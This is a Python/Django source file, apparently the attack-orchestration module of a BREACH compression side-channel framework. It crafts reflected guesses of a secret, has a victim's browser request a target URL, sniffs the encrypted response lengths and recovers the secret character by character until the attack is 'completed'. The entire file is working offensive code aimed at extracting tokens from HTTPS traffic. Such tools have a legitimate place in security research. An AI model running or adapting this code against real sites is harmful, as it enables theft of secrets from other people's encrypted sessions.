from django.utils import timezone
from django.db.models import Max

from breach.analyzer import decide_next_world_state
from breach.models import SampleSet, Round
from breach.sniffer import Sniffer

import string
import requests
import logging
import random


logger = logging.getLogger(__name__)

SAMPLES_PER_SAMPLESET = 64


class Strategy(object):
    def __init__(self, victim):
        self._victim = victim
        self._sniffer = Sniffer(victim.snifferendpoint, self._victim.sourceip, self._victim.target.host, self._victim.interface, self._victim.target.port)

        # Extract maximum round index for the current victim.
        current_round_index = Round.objects.filter(victim=self._victim).aggregate(Max('index'))['index__max']

        if not current_round_index:
            current_round_index = 1
            self._analyzed = True
            self.begin_attack()

        self._round = Round.objects.filter(victim=self._victim, index=current_round_index)[0]
        self._analyzed = False

    def _build_candidates_divide_conquer(self, state):
        candidate_alphabet_cardinality = len(state['knownalphabet']) / 2

        bottom_half = state['knownalphabet'][:candidate_alphabet_cardinality]
        top_half = state['knownalphabet'][candidate_alphabet_cardinality:]

        return [bottom_half, top_half]

    def _build_candidates_serial(self, state):
        return state['knownalphabet']

    def _build_candidates(self, state):
        '''Given a state of the world, produce a list of candidate alphabets.'''
        methods = {
            'serial': self._build_candidates_serial,
            'divide&conquer': self._build_candidates_divide_conquer
        }
        return methods[self._victim.method](state)

    def _get_first_round_state(self):
        return {
            'knownsecret': self._victim.target.prefix,
            'candidatealphabet': self._victim.target.alphabet,
            'knownalphabet': self._victim.target.alphabet
        }

    def _get_unstarted_samplesets(self):
        return SampleSet.objects.filter(
            round=self._round,
            started=None
        )

    def _reflection(self, sampleset):
        # We use '^' as a separator symbol and we assume it is not part of the
        # secret. We also assume it will not be in the content.

        # Added symbols are the total amount of dummy symbols that need to be added,
        # either in candidate alphabet or huffman complement set in order
        # to avoid huffman tree imbalance between samplesets of the same batch.
        added_symbols = self._round.maxroundcardinality - self._round.minroundcardinality

        sentinel = '^'

        assert(sentinel not in self._round.knownalphabet)
        knownalphabet_complement = list(set(string.ascii_letters + string.digits) - set(self._round.knownalphabet))

        candidate_secrets = set()
        for letter in sampleset.candidatealphabet:
            candidate_secret = self._round.knownsecret + letter
            candidate_secrets.add(candidate_secret)

        # Candidate balance indicates the amount of dummy symbols that will be included with the
        # candidate alphabet's part of the reflection.
        candidate_balance = self._round.maxroundcardinality - len(candidate_secrets)
        assert(len(knownalphabet_complement) > candidate_balance)
        candidate_balance = [self._round.knownsecret + c for c in knownalphabet_complement[0:candidate_balance]]

        # Huffman complement indicates the knownalphabet symbols that are not currently being tested
        huffman_complement = set(self._round.knownalphabet) - set(sampleset.candidatealphabet)

        huffman_balance = added_symbols - len(candidate_balance)
        assert(len(knownalphabet_complement) > len(candidate_balance) + huffman_balance)
        huffman_balance = knownalphabet_complement[len(candidate_balance):huffman_balance]

        reflected_data = [
            '',
            sentinel.join(list(candidate_secrets) + candidate_balance),
            sentinel.join(list(huffman_complement) + huffman_balance),
            ''
        ]

        reflection = sentinel.join(reflected_data)

        return reflection

    def _sampleset_to_work(self, sampleset):
        return {
            'url': self._victim.target.endpoint % self._reflection(sampleset),
            'amount': SAMPLES_PER_SAMPLESET,
            'alignmentalphabet': sampleset.alignmentalphabet,
            'timeout': 0
        }

    def get_work(self):
        '''Produces work for the victim.

        Pre-condition: There is already work to do.'''

        try:
            self._sniffer.start()
        except (requests.HTTPError, requests.exceptions.ConnectionError), err:
            if isinstance(err, requests.HTTPError):
                status_code = err.response.status_code
                logger.warning('Caught {} while trying to start sniffer.'.format(status_code))

                # If status was raised due to conflict,
                # delete already existing sniffer.
                if status_code == 409:
                    try:
                        self._sniffer.delete()
                    except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                        logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            elif isinstance(err, requests.exceptions.ConnectionError):
                logger.warning('Caught ConnectionError')

            # An error occurred, so if there is a started sampleset mark it as failed
            if SampleSet.objects.filter(round=self._round, completed=None).exclude(started=None):
                self._mark_current_work_completed()

            return {}

        unstarted_samplesets = self._get_unstarted_samplesets()

        assert(unstarted_samplesets)

        sampleset = unstarted_samplesets[0]
        sampleset.started = timezone.now()
        sampleset.save()

        work = self._sampleset_to_work(sampleset)

        logger.debug('Giving work:')
        logger.debug('\tCandidate: {}'.format(sampleset.candidatealphabet))

        return work

    def _get_current_sampleset(self):
        started_samplesets = SampleSet.objects.filter(round=self._round, completed=None).exclude(started=None)

        assert(len(started_samplesets) == 1)

        sampleset = started_samplesets[0]

        return sampleset

    def _mark_current_work_completed(self, capture=None):
        sampleset = self._get_current_sampleset()
        sampleset.completed = timezone.now()

        if capture:
            sampleset.success = True
            sampleset.data = capture
        else:
            # Sampleset data collection failed,
            # create a new sampleset for the same attack element
            s = SampleSet(
                round=sampleset.round,
                candidatealphabet=sampleset.candidatealphabet,
                alignmentalphabet=sampleset.alignmentalphabet
            )
            s.save()

        sampleset.save()

    def _collect_capture(self):
        captured_data = self._sniffer.read()
        return captured_data['capture'], captured_data['records']

    def _analyze_current_round(self):
        '''Analyzes the current round samplesets to extract a decision.'''

        current_round_samplesets = SampleSet.objects.filter(round=self._round, success=True)
        self._decision = decide_next_world_state(current_round_samplesets)

        logger.debug('############################################################################')
        logger.debug('Decision:')
        for i in self._decision:
            logger.debug('\t{}: {}'.format(i, self._decision[i]))
        logger.debug('############################################################################\n')

        self._analyzed = True

    def _round_is_completed(self):
        '''Checks if current round is completed.'''

        assert(self._analyzed)

        # Do we need to collect more samplesets to build up confidence?
        return self._decision['confidence'] > 1

    def _create_next_round(self):
        assert(self._round_is_completed())

        self._create_round(self._decision['state'])

    def _create_round(self, state):
        '''Creates a new round based on the analysis of the current round.'''

        assert(self._analyzed)

        candidate_alphabets = self._build_candidates(state)

        # This next round could potentially be the final round.
        # A final round has the complete secret stored in knownsecret.
        next_round = Round(
            victim=self._victim,
            index=self._round.index + 1 if hasattr(self, '_round') else 1,
            maxroundcardinality=max(map(len, candidate_alphabets)),
            minroundcardinality=min(map(len, candidate_alphabets)),
            amount=SAMPLES_PER_SAMPLESET,
            knownalphabet=state['knownalphabet'],
            knownsecret=state['knownsecret']
        )
        next_round.save()

        self._round = next_round

        logger.debug('Created new round:')
        logger.debug('\tKnown secret: {}'.format(next_round.knownsecret))
        logger.debug('\tKnown alphabet: {}'.format(next_round.knownalphabet))
        logger.debug('\tAmount: {}'.format(next_round.amount))

    def _create_round_samplesets(self):
        state = {
            'knownalphabet': self._round.knownalphabet,
            'knownsecret': self._round.knownsecret
        }

        candidate_alphabets = self._build_candidates(state)

        alignmentalphabet = list(self._round.victim.target.alignmentalphabet)
        random.shuffle(alignmentalphabet)
        alignmentalphabet = ''.join(alignmentalphabet)
        logger.debug('\tAlignment alphabet: {}'.format(alignmentalphabet))

        for candidate in candidate_alphabets:
            sampleset = SampleSet(
                round=self._round,
                candidatealphabet=candidate,
                alignmentalphabet=alignmentalphabet
            )
            sampleset.save()

    def _attack_is_completed(self):
        return len(self._round.knownsecret) == self._victim.target.secretlength

    def work_completed(self, success=True):
        '''Receives and consumes work completed from the victim, analyzes
        the work, and returns True if the attack is complete (victory),
        otherwise returns False if more work is needed.

        It also creates the new work that is needed.

        Post-condition: Either the attack is completed, or there is work to
        do (there are unstarted samplesets in the database).'''
        try:
            if success:
                # Call sniffer to get captured data
                capture, records = self._collect_capture()
                logger.debug('Work completed:')
                logger.debug('\tLength: {}'.format(len(capture)))
                logger.debug('\tRecords: {}'.format(records))

                # Check if all TLS response records were captured,
                # if available
                if self._victim.target.recordscardinality:
                    assert records == SAMPLES_PER_SAMPLESET * self._victim.target.recordscardinality, 'Not all records captured'
            else:
                logger.debug('Client returned fail to realtime')
                assert success

            # Stop data collection and delete sniffer
            self._sniffer.delete()
        except (requests.HTTPError, requests.exceptions.ConnectionError, AssertionError), err:
            if isinstance(err, requests.HTTPError):
                status_code = err.response.status_code
                logger.warning('Caught {} while trying to collect capture and delete sniffer.'.format(status_code))

                # If status was raised due to malformed capture,
                # delete sniffer to avoid conflict.
                if status_code == 422:
                    try:
                        self._sniffer.delete()
                    except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                        logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            elif isinstance(err, requests.exceptions.ConnectionError):
                logger.warning('Caught ConnectionError')

            elif isinstance(err, AssertionError):
                logger.warning('Realtime reported unsuccessful capture')
                try:
                    self._sniffer.delete()
                except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                    logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            # An error occurred, so if there is a started sampleset mark it as failed
            if SampleSet.objects.filter(round=self._round, completed=None).exclude(started=None):
                self._mark_current_work_completed()

            return False

        self._mark_current_work_completed(capture)

        round_samplesets = SampleSet.objects.filter(round=self._round)
        unstarted_samplesets = round_samplesets.filter(started=None)

        if unstarted_samplesets:
            # Batch is not yet complete, we need to collect more samplesets
            # that have already been created for this batch.
            return False

        # All batches are completed.
        self._analyze_current_round()

        if self._round_is_completed():
            # Advance to the next round.
            self._create_next_round()

            if self._attack_is_completed():
                return True

        # Not enough confidence, we need to create more samplesets to be
        # collected for this round.
        self._create_round_samplesets()

        return False

    def begin_attack(self):
        self._create_round(self._get_first_round_state())
        self._create_round_samplesets()
